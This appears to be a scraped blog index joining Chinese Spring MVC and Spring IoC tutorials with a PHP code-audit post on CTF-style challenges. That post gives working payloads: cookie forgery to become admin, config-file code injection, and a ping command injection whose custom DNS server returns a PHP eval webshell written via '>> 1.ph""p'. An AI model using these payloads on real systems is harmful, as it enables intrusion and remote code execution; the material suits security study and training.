我们也可以直接将@RequestMapping添加到类名上，表示为此类中的所有请求映射添加一个路径前缀，比如： 123456789@Controller@RequestMapping(&quot;/yyds&quot;)public class MainController &#123; @RequestMapping(&#123;&quot;/index&quot;, &quot;/test&quot;&#125;) public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;); &#125;&#125; 那么现在我们需要访问/yyds/index或是/yyds/test才可以得到此页面。我们可以直接在IDEA下方的端点板块中查看当前Web应用程序定义的所有请求映射，并且可以通过IDEA为我们提供的内置Web客户端直接访问某个路径。 路径还支持使用通配符进行匹配： ?：表示任意一个字符，比如@RequestMapping(&quot;/index/x?&quot;)可以匹配&#x2F;index&#x2F;xa、&#x2F;index&#x2F;xb等等。 *：表示任意0-n个字符，比如@RequestMapping(&quot;/index/*&quot;)可以匹配&#x2F;index&#x2F;lbwnb、&#x2F;index&#x2F;yyds等。 **：表示当前目录或基于当前目录的多级目录，比如@RequestMapping(&quot;/index/**&quot;)可以匹配&#x2F;index、&#x2F;index&#x2F;xxx等。 我们接着来看下一个method属性，顾名思义，它就是请求的方法类型，我们可以限定请求方式，比如： 1234@RequestMapping(value = &quot;/index&quot;, method = RequestMethod.POST)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; 现在我们如果直接使用浏览器访问此页面，会显示405方法不支持，因为浏览器默认是直接使用GET方法获取页面，而我们这里指定为POST方法访问此地址，所以访问失败，我们现在再去端点中用POST方式去访问，成功得到页面。 我们也可以使用衍生注解直接设定为指定类型的请求映射： 1234@PostMapping(value = &quot;/index&quot;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; 这里使用了@PostMapping直接指定为POST请求类型的请求映射，同样的，还有@GetMapping可以直接指定为GET请求方式，这里就不一一列举了。 我们可以使用params属性来指定请求必须携带哪些请求参数，比如： 1234@RequestMapping(value = &quot;/index&quot;, params = &#123;&quot;username&quot;, &quot;password&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; 比如这里我们要求请求中必须携带username和password属性，否则无法访问。它还支持表达式，比如我们可以这样编写： 1234@RequestMapping(value = &quot;/index&quot;, params = &#123;&quot;!username&quot;, &quot;password&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; 在username之前添加一个感叹号表示请求的不允许携带此参数，否则无法访问，我们甚至可以直接设定一个固定值： 1234@RequestMapping(value = &quot;/index&quot;, params = &#123;&quot;username!=test&quot;, &quot;password=123&quot;&#125;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; 这样，请求参数username不允许为test，并且password必须为123，否则无法访问。 header属性用法与params一致，但是它要求的是请求头中需要携带什么内容，比如： 1234@RequestMapping(value = &quot;/index&quot;, headers = &quot;!Connection&quot;)public ModelAndView index()&#123; return new ModelAndView(&quot;index&quot;);&#125; 那么，如果请求头中携带了Connection属性，将无法访问。其他两个属性： consumes： 指定处理请求的提交内容类型（Content-Type），例如application&#x2F;json, text&#x2F;html; produces: 指定返回的内容类型，仅当request请求头中的(Accept)类型中包含该指定类型才返回； @RequestParam和@RequestHeader详解我们接着来看，如何获取到请求中的参数。 我们只需要为方法添加一个形式参数，并在形式参数前面添加@RequestParam注解即可： 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(@RequestParam(&quot;username&quot;) String username)&#123; System.out.println(&quot;接受到请求参数：&quot;+username); return new ModelAndView(&quot;index&quot;);&#125; 我们需要在@RequestParam中填写参数名称，参数的值会自动传递给形式参数，我们可以直接在方法中使用，注意，如果参数名称与形式参数名称相同，即使不添加@RequestParam也能获取到参数值。 一旦添加@RequestParam，那么此请求必须携带指定参数，我们也可以将require属性设定为false来将属性设定为非必须： 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(@RequestParam(value = &quot;username&quot;, required = false) String username)&#123; System.out.println(&quot;接受到请求参数：&quot;+username); return new ModelAndView(&quot;index&quot;);&#125; 我们还可以直接设定一个默认值，当请求参数缺失时，可以直接使用默认值： 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(@RequestParam(value = &quot;username&quot;, required = false, defaultValue = &quot;伞兵一号&quot;) String username)&#123; System.out.println(&quot;接受到请求参数：&quot;+username); return new ModelAndView(&quot;index&quot;);&#125; 如果需要使用Servlet原本的一些类，比如： 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(HttpServletRequest request)&#123; System.out.println(&quot;接受到请求参数：&quot;+request.getParameterMap().keySet()); return new ModelAndView(&quot;index&quot;);&#125; 直接添加HttpServletRequest为形式参数即可，SpringMVC会自动传递该请求原本的HttpServletRequest对象，同理，我们也可以添加HttpServletResponse作为形式参数，甚至可以直接将HttpSession也作为参数传递： 123456@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(HttpSession session)&#123; System.out.println(session.getAttribute(&quot;test&quot;)); session.setAttribute(&quot;test&quot;, &quot;鸡你太美&quot;); return new ModelAndView(&quot;index&quot;);&#125; 我们还可以直接将请求参数传递给一个实体类： 12345@Datapublic class User &#123; String username; String password;&#125; 注意必须携带set方法或是构造方法中包含所有参数，请求参数会自动根据类中的字段名称进行匹配： 12345@RequestMapping(value = &quot;/index&quot;)public ModelAndView index(User user)&#123; System.out.println(&quot;获取到cookie值为：&quot;+user); return new ModelAndView(&quot;index&quot;);&#125; @RequestHeader与@RequestParam用法一致，不过它是用于获取请求头参数的，这里就不再演示了。 @CookieValue和@SessionAttrbutie通过使用@CookieValue注解，我们也可以快速获取请求携带的Cookie信息： 12345678 @RequestMapping(&quot;/cookie&quot;) //直接填写访问路径// @RequestMapping(value = &quot;/index&quot;) public ModelAndView index(HttpServletResponse response, @CookieValue(value = &quot;test&quot;,required = false) String test)&#123; ModelAndView modelAndView = new ModelAndView(&quot;index&quot;); response.addCookie(new Cookie(&quot;test&quot;,&quot;lbwnb&quot;)); System.out.println(&quot;获取到cookie值为：&quot;+test); return modelAndView; &#125; 同样的，Session也能使用注解快速获取： 12345678910@RequestMapping(&quot;/session&quot;)public ModelAndView session(@SessionAttribute(value=&quot;test&quot;,required = false) String test, HttpSession session)&#123; session.setAttribute(&quot;test&quot;,&quot;admin&quot;); System.out.println(test); String username = (String) session.getAttribute(&quot;test&quot;); System.out.println(&quot;Session 中的用户名：&quot; + username); return new ModelAndView(&quot;index&quot;);&#125; 可以发现，通过使用SpringMVC框架，整个Web应用程序的开发变得非常简单，大部分功能只需要一个注解就可以搞定了，正是得益于Spring框架，SpringMVC才能大显身手。 重定向和请求转发重定向和请求转发也非常简单，我们只需要在视图名称前面添加一个前缀即可，比如重定向： 1234@GetMapping(&quot;/redirect&quot;)public String redirect()&#123; return &quot;redirect:/test/cookie&quot;;&#125; 通过添加redirect:前缀，就可以很方便地实现重定向，那么请求转发呢，其实也是一样的，使用forward:前缀表示转发给其他请求映射： 1234@GetMapping(&quot;forward&quot;)public String forward()&#123; return &quot;forward:/test/cookie&quot;;&#125; 使用SpringMVC，只需要一个前缀就可以实现重定向和请求转发，非常方便。 RestFul风格中文释义为“表现层状态转换”（名字挺高大上的），它不是一种标准，而是一种设计风格。它的主要作用是充分并正确利用HTTP协议的特性，规范资源获取的URI路径。通俗的讲，RESTful风格的设计允许将参数通过URL拼接传到服务端，目的是让URL看起来更简洁实用，并且我们可以充分使用多种HTTP请求方式（POST&#x2F;GET&#x2F;PUT&#x2F;DELETE），来执行相同请求地址的不同类型操作。 因此，这种风格的连接，我们就可以直接从请求路径中读取参数，比如： 1http://localhost:8080/mvc/index/123456 我们可以直接将index的下一级路径作为请求参数进行处理，也就是说现在的请求参数包含在了请求路径中,注意请求路径我们可以手动添加类似占位符一样的信息，这样占位符位置的所有内容都会被作为请求参数，而方法的形参列表中必须包括一个与占位符同名的并且添加了@PathVariable注解的参数，或是由@PathVariable注解指定为占位符名称： 12345@GetMapping(&quot;/restful/&#123;str&#125;&quot;) public String restful(@PathVariable String str)&#123; System.out.println(str); return &quot;index&quot;; &#125; 如果没有配置正确，方法名称上会出现黄线。 我们可以按照不同功能进行划分： POST http://localhost:8080/mvc/index - 添加用户信息，携带表单数据 GET http://localhost:8080/mvc/index/{id} - 获取用户信息，id直接放在请求路径中 PUT http://localhost:8080/mvc/index - 修改用户信息，携带表单数据 DELETE http://localhost:8080/mvc/index/{id} - 删除用户信息，id直接放在请求路径中 我们分别编写四个请求映射： 123456789101112131415161718192021222324252627@Controllerpublic class MainController &#123; @RequestMapping(value = &quot;/index/&#123;id&#125;&quot;, method = RequestMethod.GET) public String get(@PathVariable(&quot;id&quot;) String text)&#123; System.out.println(&quot;获取用户：&quot;+text); return &quot;index&quot;; &#125; @RequestMapping(value = &quot;/index&quot;, method = RequestMethod.POST) public String post(String username)&#123; System.out.println(&quot;添加用户：&quot;+username); return &quot;index&quot;; &#125; @RequestMapping(value = &quot;/index/&#123;id&#125;&quot;, method = RequestMethod.DELETE) public String delete(@PathVariable(&quot;id&quot;) String text)&#123; System.out.println(&quot;删除用户：&quot;+text); return &quot;index&quot;; &#125; @RequestMapping(value = &quot;/index&quot;, method = RequestMethod.PUT) public String put(String username)&#123; System.out.println(&quot;修改用户：&quot;+username); return &quot;index&quot;; &#125;&#125; Interceptor拦截器拦截器是整个SpringMVC的一个重要内容，拦截器与过滤器类似，都是用于拦截一些非法请求，但是我们之前讲解的过滤器是作用于Servlet之前，只有经过层层的过滤器才可以成功到达Servlet，而拦截器并不是在Servlet之前，它在Servlet与RequestMapping之间，相当于DispatcherServlet在将请求交给对应Controller中的方法之前进行拦截处理，它只会拦截所有Controller中定义的请求映射对应的请求（不会拦截静态资源），这里一定要区分两者的不同。 创建拦截器创建一个拦截器我们需要实现一个HandlerInterceptor接口： 123456789101112131415161718public class MainInterceptor implements HandlerInterceptor &#123; @Override public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) throws Exception &#123; System.out.println(&quot;我是处理之前！&quot;); return true; //只有返回true才会继续，否则直接结束 &#125; @Override public void postHandle(HttpServletRequest request, HttpServletResponse response, Object handler, ModelAndView modelAndView) throws Exception &#123; System.out.println(&quot;我是处理之后！&quot;); &#125; @Override public void afterCompletion(HttpServletRequest request, HttpServletResponse response, Object handler, Exception ex) throws Exception &#123; //在DispatcherServlet完全处理完请求后被调用 System.out.println(&quot;我是完成之后！&quot;); &#125;&#125; 接着我们需要在配置类中进行注册： 123456@Overridepublic void addInterceptors(InterceptorRegistry registry) &#123; registry.addInterceptor(new MainInterceptor()) .addPathPatterns(&quot;/**&quot;) //添加拦截器的匹配路径，只要匹配一律拦截 .excludePathPatterns(&quot;/home&quot;); //拦截器不进行拦截的路径&#125; 现在我们在浏览器中访问index页面，拦截器已经生效。 得到整理拦截器的执行顺序： 1234我是处理之前！我是处理！我是处理之后！我是完成之后！","tags":["java 开发"],"categories":["开发"]},{"title":"php 代码审计","path":"/2024/09/09/php/代码审计小题目/","content":"收集一些 php 的奇技淫巧，来自于 p 神知识星球和 github 上的一些靶场 0x0001环境：PHP5.4.30 1234567891011121314151617181920212223242526272829303132333435363738394041&lt;?php$users = array( &quot;0:9b5c3d2b64b8f74e56edec71462bd97a&quot; , &quot;1:4eb5fb1501102508a86971773849d266&quot;, &quot;2:facabd94d57fc9f1e655ef9ce891e86e&quot;, &quot;3:ce3924f011fe323df3a6a95222b0c909&quot;, &quot;4:7f6618422e6a7ca2e939bd83abde402c&quot;, &quot;5:06e2b745f3124f7d670f78eabaa94809&quot;, &quot;6:8e39a6e40900bb0824a8e150c0d0d59f&quot;, &quot;7:d035e1a80bbb377ce1edce42728849f2&quot;, &quot;8:0927d64a71a9d0078c274fc5f4f10821&quot;, &quot;9:e2e23d64a642ee82c7a270c6c76df142&quot;, &quot;10:70298593dd7ada576aff61b6750b9118&quot;);$valid_user = false;$input = $_COOKIE[&#x27;user&#x27;];$input[1] = md5($input[1]);foreach ($users as $user)&#123; $user = explode(&quot;:&quot;, $user); if ($input === $user) &#123; $uid = $input[0] + 0; $valid_user = true; &#125;&#125;if (!$valid_user) &#123; die(&quot;not a valid user &quot;);&#125;if ($uid == 0) &#123; echo &quot;Hello Admin How can I serve you today? &quot;; echo &quot;SECRETS .... &quot;;&#125; else &#123; echo &quot;Welcome back user &quot;;&#125; 用户5的密码Hash06e2b745f3124f7d670f78eabaa94809，密码明文是hund，在德语中是狗的意思。 我们现在知道从COOKIE中获取数据，作为数组进行储存。数组包含两个元素：用户ID和密码明文。还知道用户5的密码明文是hund。这意味着，我们可以通过设置cookie以用户5的身份进行登录。 1Cookie:user[0]=5;user[1]=hund; 但是走到 $input === $user 后,将cookie中的$uid加上0来强制转换为数字类型。此外，还将$valid_user设为true 所以 $uid 此时就等于 5 。 为了能继续往后做，这里就要补充一个关于 PHP 5.4.30 的知识点了。 不同数组之间比较由于整数键截断导致结果相同 整数key截断问题发生在zend_hash_compare()函数这里，在数组进行比较时，数字型下标在比较时，是通过各自的值相减结果来判断的，值是存放在bucket类型的h。通过判断结果是否为0决定是否相等。然而，h的数据类型bucket被定义为unsigned long，在64位系统中，通常是64位，但是result变量却只是32位int类型。因此，当比较结果的低32位全是0的话，比较结果会是相等。因此，key=0和key=4294967296(0x10000000)以及其他的key都被认为相等。 也就是说 1arr[0] =&gt; 1 === arr[4294967296] =&gt; 1 所以我们可以让用户 5 伪造成用户 0 登录，我们修改 Cookie 1Cookie:user[4294967296]=5;user[1]=hund; 此时的 $input 1[4294967296 =&gt; &quot;5&quot;,1 =&gt; &quot;hund&quot;] 判断 $input === $user 时，会把 input[4294967296] 看成 **input[0]**，成功进入 if 里面，因为$input[0]并没有被初始化，所以当其加上0时，结果为0。这时，用户身份就从用户5变成了用户0，admin身份。 这里复现要下载对应的 php 版本，我就偷个懒直接找在线环境测试。 Online PHP editor | Test code in 250+ PHP versions (3v4l.org) 123456&lt;?php$input = [4294967296 =&gt; &quot;5&quot;,1 =&gt; &#x27;hund&#x27;];$input2 = [0 =&gt; &quot;5&quot;,1 =&gt; &#x27;hund&#x27;];if($input === $input2)&#123; echo &quot;yes&quot;;&#125; 可以看到只有在 PHP5.4.0-5.4.43,5.5.0-5.5.26,5.6.0-5.6.1 版本中才能以admin身份登录 影响范围PHP5.4.0-5.4.43,5.5.0-5.5.26,5.6.0-5.6.1 0x00021234567891011121314151617&lt;?phpshow_source(__FILE__);$flag = &quot;xxxx&quot;;if(isset($_GET[&#x27;time&#x27;]))&#123; if(!is_numeric($_GET[&#x27;time&#x27;]))&#123; echo &#x27;The time must be number.&#x27;; &#125;else if($_GET[&#x27;time&#x27;] &lt; 60 * 60 * 24 * 30 * 2)&#123; echo &#x27;This time is too short.&#x27;; &#125;else if($_GET[&#x27;time&#x27;] &gt; 60 * 60 * 24 * 30 * 3)&#123; echo &#x27;This time is too long.&#x27;; &#125;else&#123; sleep((int)$_GET[&#x27;time&#x27;]); echo $flag; &#125; echo &#x27;&lt;hr&gt;&#x27;; &#125;?&gt; 1234&gt;&gt;&gt; 60 * 60 * 24 * 30 * 25184000&gt;&gt;&gt; 60 * 60 * 24 * 30 * 37776000 要绕过前面两个 if 很简单，但是后面等待的时间会很长，is_numeric 可以识别支持普通数字型字符串、科学记数法型字符串、部分支持十六进制0x型字符串。而强制类型转换int，不能正确转换的类型有十六进制型字符串、科学计数法型字符串（部分） 比如 1echo (int)&quot;6e6&quot;; 输出的结果是 6； 1echo (int)&quot;0x4f1a00&quot; 输出结果是 0； 如果你想将十六进制字符串转换为整数，应该使用 intval 并指定基数： 1$intValue = intval(&quot;1A&quot;, 16); // 结果为 26 科学技术法的话，先转为浮点数再用 int 1$intValue = (int)floatval(&quot;1.23e4&quot;); // 结果为 12300 0x0003index.php 123456&lt;?phphighlight_file(__FILE__);$str = addslashes($_GET[&#x27;option&#x27;]);$file = file_get_contents(&#x27;option.php&#x27;);$file = preg_replace(&#x27;|\\$option=\\&#x27;.*\\&#x27;;|&#x27;, &quot;\\$option=&#x27;$str&#x27;;&quot;, $file);file_put_contents(&#x27;option.php&#x27;, $file); option.php 123&lt;?phphighlight_file(__FILE__);$option=&#x27;&#x27;; 流程如下： 对传入的option参数进行addslashes，比如有单引号&#39;，会变成\\&#39; 通过正则匹配xxxxx&#x2F;option.php中的$option=&#39;xxx&#39;;，将xxx的内容替换为经第一步处理的值 替换完成，将其写入xxxxx&#x2F;option.php。 场景： 用于写入配置文件等。 法一1option=a&#x27;;%0aphpinfo();// 然后 1option=a 利用的是 .* 的正则匹配漏洞，第一次经过 addslashes 函数后，得到 1a\\&#x27;;%0aphpinfo();// option.php 里变成 1234&lt;?phphighlight_file(__FILE__);$option=&#x27;a\\&#x27;;phpinfo();//&#x27;; 第二次访问 1option=a 会匹配两个单引号1里的内容即 a\\,替换为 a，此时的 option.php 里的内容变为 1234&lt;?phphighlight_file(__FILE__);$option=&#x27;a&#x27;;phpinfo();//&#x27;; 法二1?option=aaa\\&#x27;;phpinfo();// 经过addslashes后，$str为 aaa\\\\\\&#39;;phpinfo();// 经过 preg_replace 后三个\\ 变成两个 \\, 猜测是 preg_replace 做了转义处理。 0x00041234567891011121314151617181920&lt;?phpheader(&#x27;Content-Type: text/plain&#x27;);$ip = $_GET[&#x27;ip&#x27;] ?? exit;duita($ip);$ip = escapeshellcmd($ip);$ip = str_replace(&#x27;\\&gt;&#x27;, &#x27;&gt;&#x27;, $ip);$ip = str_replace(&#x27;\\&lt;&#x27;, &#x27;&lt;&#x27;, $ip);$cmd = sprintf(&#x27;ping -c 2 %s&#x27;, $ip);echo shell_exec($cmd);function duita($ip)&#123; if (strpbrk($ip, &quot;&amp;;`|*?()$\\\\\\x00&quot;) !== false) &#123; exit(&#x27;WAF&#x27;); &#125; if (stripos($ip, &#x27;.php&#x27;) !== false) &#123; exit(&#x27;WAF&#x27;); &#125;&#125;?&gt; 可以发现这里有两个考点 写入 webshell 绕过 .php 检测 绕过 .php 检测很简单，来看一官方文档里的 escapeshellcmd 反斜线（\\）会在以下字符之前插入： *&amp;#;&#96;|*?~&lt;&gt;^()[]{}$*, \\x0A 和 \\xFF。 ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 重点就在于 ‘ 和 “ 仅在不配对儿的时候被转义，所以如果在配对情况下， bash 中 “” 是空字符串,在 bash 里 “” 就不会保留了 shell.ph\"\"p1shell.ph&quot;&quot;p 接下来就是怎么写入 shell 了。 ping www.baidu.com ，可以看到输出的界面有一个cname的地址www.a.shifen.com。可控。 使用dnspod配置特殊字符无效。 其余平台未测试，然后尝试自己搭建一个dns服务 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132# coding=utf-8&quot;&quot;&quot;LICENSE http://www.apache.org/licenses/LICENSE-2.0&quot;&quot;&quot;import datetimeimport sysimport timeimport threadingimport tracebackimport socketserverfrom dnslib import *import binascii # 用于处理十六进制编码和解码# 定义基本域名和 IP 地址TTL = 60 * 5 # 定义生存时间 (TTL)，单位为秒# 处理 DNS 请求，生成响应def dns_response(data): # 解析请求数据 request = DNSRecord.parse(data) print(request) # 打印请求内容 # 创建回复报文，带上请求头的 ID 和相关信息 reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q) # 获取请求的域名和类型 qname = request.q.qname qn = str(qname) # 转换为字符串形式 qtype = request.q.qtype qt = QTYPE[qtype] # 请求的类型（如 A、NS 等） # 检查请求的域名是否匹配 if qn.startswith(&#x27;aaa.dddns.320ctf.fun&#x27;): rdata = CNAME(&#x27;&lt;?=eval($_POST[1])?&gt;.dddns.320ctf.fun&#x27;) reply.add_answer(RR(rname=qname, rtype=5, rclass=1, ttl=TTL, rdata=rdata)) else: rdata = A(&#x27;81.71.96.92&#x27;) reply.add_answer(RR(rname=qname, rtype=1, rclass=1, ttl=TTL, rdata=rdata)) print(&quot;---- Reply: &quot;, reply) # 打印回复内容 return reply.pack() # 返回打包后的 DNS 响应# 定义通用的请求处理类，提供获取和发送数据的抽象方法class BaseRequestHandler(socketserver.BaseRequestHandler): def get_data(self): raise NotImplementedError def send_data(self, data): raise NotImplementedError def handle(self): # 获取当前时间 now = datetime.datetime.utcnow().strftime(&#x27;%Y-%m-%d %H:%M:%S.%f&#x27;) print(&quot; %s request %s (%s %s):&quot; % (self.__class__.__name__[:3], now, self.client_address[0], self.client_address[1])) try: # 处理收到的 DNS 请求数据 data = self.get_data() print(len(data), binascii.hexlify(data)) # 使用 binascii 进行十六进制编码输出 # 发送 DNS 响应 self.send_data(dns_response(data)) except Exception: # 如果出现错误，打印错误信息 traceback.print_exc(file=sys.stderr)# 定义 TCP 请求处理类class TCPRequestHandler(BaseRequestHandler): def get_data(self): # 接收 TCP 数据并检查长度 data = self.request.recv(8192).strip() sz = int(binascii.hexlify(data[:2]), 16) # 使用 binascii 进行十六进制解码 if sz &lt; len(data) - 2: raise Exception(&quot;Wrong size of TCP packet&quot;) # 如果数据长度错误，抛出异常 elif sz &gt; len(data) - 2: raise Exception(&quot;Too big TCP packet&quot;) # 如果数据过大，抛出异常 return data[2:] def send_data(self, data): # 发送 TCP 数据时，先将数据长度编码为 16 进制并发送 sz = binascii.unhexlify(hex(len(data))[2:].zfill(4)) # 使用 binascii 将长度转换为 16 进制 return self.request.sendall(sz + data)# 定义 UDP 请求处理类class UDPRequestHandler(BaseRequestHandler): def get_data(self): # 直接返回接收到的 UDP 数据 return self.request[0].strip() def send_data(self, data): # 发送 UDP 响应数据 return self.request[1].sendto(data, self.client_address)# 主程序入口if __name__ == &#x27;__main__&#x27;: print(&quot;Starting nameserver...&quot;) # 创建 TCP 和 UDP 服务器，监听指定端口 servers = [ socketserver.ThreadingUDPServer((&#x27;&#x27;, 53), UDPRequestHandler), socketserver.ThreadingTCPServer((&#x27;&#x27;, 53), TCPRequestHandler), ] # 为每个服务器创建一个线程并启动 for s in servers: thread = threading.Thread(target=s.serve_forever) # 服务器线程将为每个请求创建新线程 thread.daemon = True # 主线程退出时自动终止服务器线程 thread.start() print(&quot;%s server loop running in thread: %s&quot; % (s.RequestHandlerClass.__name__[:3], thread.name)) # 主线程保持运行，直到手动终止 try: while 1: time.sleep(1) # 每秒输出一次状态 sys.stderr.flush() # 刷新标准错误输出 sys.stdout.flush() # 刷新标准输出 except KeyboardInterrupt: pass # 捕获 Ctrl+C 中断 finally: # 停止服务器 for s in servers: s.shutdown() 记得把域名的 dns 解析全关了，服务器的默认 dns 也关 ，腾讯云的 53 tcp and udp 都要放行 12345sudo systemctl disable systemd-resolvedsudo systemctl stop systemd-resolved# 实验结束后记得开回来sudo systemctl start systemd-resolvedsudo systemctl enable systemd-resolved # 开机自动启动 dig 一下可以发现 shell 被返回了 但是 ping 一直没结果，部分公共dns不可能 。 会过滤这些特殊符号。 可以使用dnspod的公共dns服务。 119.29.29.29 payload 1ping -c 2 aaa.dddns.320ctf.fun &gt;&gt; 1.ph&quot;&quot;p","tags":["php 安全"],"categories":["php 安全","代码审计"]},{"title":"Spring 学习","path":"/2024/09/05/java/开发/Spring/","content":"后天要去审 java 代码呢，临时抱佛脚把 spring 过一遍吧 0x01 意义直接看百度百科 1.低侵入式设计，代码污染极低 2.独立于各种应用服务器，基于Spring框架的应用，可以真正实现Write Once,Run Anywhere的承诺 3.Spring的DI机制降低了业务对象替换的复杂性，提高了组件之间的解耦 4.Spring的AOP支持允许将一些通用任务如安全、事务、日志等进行集中式管理，从而提供了更好的复用 5.Spring的ORM和DAO提供了与第三方持久层框架的良好整合，并简化了底层的数据库访问 6.Spring并不强制应用完全依赖于Spring，开发者可自由选用Spring框架的部分或全部 没学过开发知识得看到这几条一定很懵（学过一不一定看得懂，不管那么多反正它好用我们学就是了（又水了一些字数 &#x3D;&#x3D;总结一句话：Spring就是一个轻量级的控制反转（IOC）和面向切面编程（AOP）的框架！&#x3D;&#x3D; 0x02 认识组成 Spring 框架是一个分层架构，由 7 个定义良好的模块组成。Spring 模块构建在核心容器之上，核心容器定义了创建、配置和管理 bean 的方式 . 组成 Spring 框架的每个模块（或组件）都可以单独存在，或者与其他一个或多个模块联合实现。每个模块的功能如下： 核心容器：核心容器提供 Spring 框架的基本功能。核心容器的主要组件是 BeanFactory，它是工厂模式的实现。BeanFactory 使用控制反转（IOC） 模式将应用程序的配置和依赖性规范与实际的应用程序代码分开。 Spring 上下文：Spring 上下文是一个配置文件，向 Spring 框架提供上下文信息。Spring 上下文包括企业服务，例如 JNDI、EJB、电子邮件、国际化、校验和调度功能。 Spring AOP：通过配置管理特性，Spring AOP 模块直接将面向切面的编程功能 , 集成到了 Spring 框架中。所以，可以很容易地使 Spring 框架管理任何支持 AOP的对象。Spring AOP 模块为基于 Spring 的应用程序中的对象提供了事务管理服务。通过使用 Spring AOP，不用依赖组件，就可以将声明性事务管理集成到应用程序中。 Spring DAO：JDBC DAO 抽象层提供了有意义的异常层次结构，可用该结构来管理异常处理和不同数据库供应商抛出的错误消息。异常层次结构简化了错误处理，并且极大地降低了需要编写的异常代码数量（例如打开和关闭连接）。Spring DAO 的面向 JDBC 的异常遵从通用的 DAO 异常层次结构。 Spring ORM：Spring 框架插入了若干个 ORM 框架，从而提供了 ORM 的对象关系工具，其中包括 JDO、Hibernate 和 iBatis SQL Map。所有这些都遵从 Spring 的通用事务和 DAO 异常层次结构。 Spring Web 模块：Web 上下文模块建立在应用程序上下文模块之上，为基于 Web 的应用程序提供了上下文。所以，Spring 框架支持与 Jakarta Struts 的集成。Web 模块还简化了处理多部分请求以及将请求参数绑定到域对象的工作。 Spring MVC 框架：MVC 框架是一个全功能的构建 Web 应用程序的 MVC 实现。通过策略接口，MVC 框架变成为高度可配置的，MVC 容纳了大量视图技术，其中包括 JSP、Velocity、Tiles、iText 和 POI。 PS： 直接复制狂神师傅的笔记，太晦涩难懂了，我还是先学会怎么用吧，概念这东西用着用着就理解了。 IoC基础IoC全称 Inversion of Control，直译为控制反转，Spring 提供的容器又称为 IoC 容器。 我们先来看看以往正常业务的控制流程，DAO 和 Service 层密切合作，以确保应用程序能够高效且可靠地运行 DAO 就是处理数据库操作的专家，你不需要关心它怎么和数据库打交道，你只需要告诉它你需要什么数据，它会帮你搞定。 Service 就是业务逻辑的管理者，它负责处理你的业务需求，比如用户注册、登录等。Service 会调用 DAO 来获取或保存数据，但它主要关注的是业务逻辑的正确性。 比如有一个用户查询的业务需求 UserDao 接口 123public interface UserDao &#123; void getUser();&#125; UserDaoImpl 实现类 12345public class UserDaoImpl implements UserDao &#123; public void getUser() &#123; System.out.println(&quot;默认获取用户数据&quot;); &#125;&#125; UserService 业务接口 123public interface UserService &#123; void getUser();&#125; UserServiceImpl 业务实现类 12345678public class UserServiceImpl implements UserService &#123; private UserDao userDao = new UserDaoImpl(); public void getUser() &#123; userDao.getUser(); &#125;&#125; 测试 12345678public class MyTest &#123; public static void main(String[] args) &#123; //用户实际调用的是业务层，dao层他们不需要接触！ UserService userService = new UserServiceImpl(); userService.getUser(); &#125;&#125; 在我们之前的业务中，用户的需求可能会影响我们原来的代码，我们需要根据用户的需求去修改原代码！如果程序代码量十分大，修改一次的成本代价十分昂贵！ 比如用户提了一个需求，想分别用 MySql，SqlServer，Oracle 数据库获取用户数据，那我们呢就需要把Userdao的实现类增加一个 123456public class UserDaoMySqlImpl implements UserDao &#123; @Override public void getUser() &#123; System.out.println(&quot;MySql获取用户数据&quot;); &#125;&#125; 还要去service实现类里面修改对应的实现 1234567public class UserServiceImpl implements UserService &#123; private UserDao userDao = new UserDaoMySqlImpl(); @Override public void getUser() &#123; userDao.getUser(); &#125;&#125; 当业务变得复杂起来的时候，我们这样既要改数据处理又要改业务处理是很麻烦的一件事，那么如何解决呢？ 我们使用一个Set接口实现，已经发生了革命性的变化！ 1234567891011public class UserServiceImpl implements UserService &#123; private UserDao userDao; // 利用set实现 public void setUserDao(UserDao userDao) &#123; this.userDao = userDao; &#125; @Override public void getUser() &#123; userDao.getUser(); &#125;&#125; 123456789@Testpublic void test()&#123; UserServiceImpl service = new UserServiceImpl(); service.setUserDao( new UserDaoMySqlImpl() ); service.getUser(); //那我们现在又想用Oracle去实现呢 service.setUserDao( new UserDaoOracleImpl() ); service.getUser();&#125; 之前，程序是主动创建对象！控制权在程序猿手上！使用了set注入后，程序不再具有主动性，而是变成了被动的接收对象！ 这种思想，从本质上解决了问题，我们程序猿不用再去管理对象的创建了。系统的耦合性大大降低~，可以更加专注的在业务的实现上！这是IOC的原型！ 从服务端主导控制权反转到了客户端，也就是客户端主导权，这就是控制反转IOC的意思 hello spring上面讲的 IOc 是我们自己实现的，现在来看看 spring 是怎么处理的。 新建一个maven项目，编写实体类 123456789101112131415161718public class Hello &#123; private String str; public String getStr() &#123; return str; &#125; public void setStr(String str) &#123; this.str = str; &#125; @Override public String toString() &#123; return &quot;Hello&#123;&quot; + &quot;str=&#x27;&quot; + str + &#x27;\\&#x27;&#x27; + &#x27;&#125;&#x27;; &#125;&#125; 编写xml配置文件 1234567891011121314151617181920&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;beans xmlns=&quot;http://www.springframework.org/schema/beans&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xsi:schemaLocation=&quot;http://www.springframework.org/schema/beans https://www.springframework.org/schema/beans/spring-beans.xsd&quot;&gt; &lt;!--使用Spring来创建对象，在Spring这些都称为Bean 类型 变量名 = new 类型(); Hello hello = new Hello(); id = 变量名 class = new的对象 property 相当于给对象中的属性设置一个值！ --&gt; &lt;bean id=&quot;hello&quot; class=&quot;com.she11F.Hello&quot;&gt; &lt;property name=&quot;str&quot; value=&quot;Spring&quot;/&gt; 